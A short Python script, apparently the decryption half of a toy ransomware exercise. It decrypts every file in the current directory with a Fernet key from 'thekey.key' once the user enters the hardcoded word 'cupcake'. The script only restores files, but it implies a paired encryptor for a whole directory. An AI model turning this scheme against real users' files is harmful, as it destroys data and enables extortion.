import os
from cryptography.fernet import Fernet  ## Used to generate the encryption key

files = []

for file in os.listdir():  ## Looping through the directory and searching for files
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":  ## Dont want to decrypt the encryption script and the key
        continue
    if os.path.isfile(file):  ## Appending all the files we want to encrypt in the empty list
        files.append(file)

print(files)  

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretword = "cupcake"
userword = input("Enter the secret word to decrypt your files:\n")

if userword == secretword:
    for file in files:
        with open(file, "rb") as thefile:  ## Opening and reading the files
            content = thefile.read() 
        content_decrypted = Fernet(secretkey).decrypt(content)  ## Decrypting the content of the file
        with open(file, "wb") as thefile:  ## Writing the decrypted content in the files
            thefile.write(content_decrypted)
    print("Your files are decrypted")
else:
    print("Wrong secret word")
